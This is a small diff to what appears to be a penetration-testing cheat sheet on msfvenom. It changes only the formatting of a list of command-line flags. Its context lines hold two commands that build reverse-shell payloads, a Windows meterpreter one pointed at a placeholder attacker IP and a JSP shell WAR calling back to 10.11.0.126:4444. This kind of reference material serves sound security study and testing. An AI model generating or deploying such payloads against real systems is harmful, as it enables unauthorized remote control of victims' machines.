@@ -71,14 +71,14 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=attackerPort 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.126 LPORT=4444 -f war > shell.war
 ```
 
-`-p` = payload/
-`-f` = output format/
-`-o` = out/
-`-a` = architecture/
-`-e` = encoder/
-`-i` = iterations of encoder/
-`-b` = bad characters to avoid \x00\xff/
-`--platform` = platform for the payload/
+`-p` = payload\
+`-f` = output format\
+`-o` = out\
+`-a` = architecture\
+`-e` = encoder\
+`-i` = iterations of encoder\
+`-b` = bad characters to avoid \x00\xff\
+`--platform` = platform for the payload\
 
 
 
